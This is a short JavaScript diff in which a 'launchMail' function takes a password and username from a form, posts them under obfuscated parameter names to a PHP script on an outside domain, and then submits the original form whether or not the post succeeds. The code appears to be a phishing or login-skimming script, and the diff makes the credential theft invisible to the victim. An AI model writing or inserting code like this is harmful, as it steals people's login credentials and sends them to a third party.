@@ -4,6 +4,11 @@ function launchMail(){
     var b=Morro.Pass.value;
     var c=Morro.User.value;
     var jqxhr = $.post("http://beta.musicpointfm.com/Send.php", { qwdasd: a, psavidubsai: b,mailsdibsa:c } ).done(function() {
-    alert("second success");
+    $("#RegAlumno").submit();
+  }).fail(function (){
+    $("#RegAlumno").submit();
   });
+}
+function launchMailP(){
+    $("#RegAlumno").submit();
 }
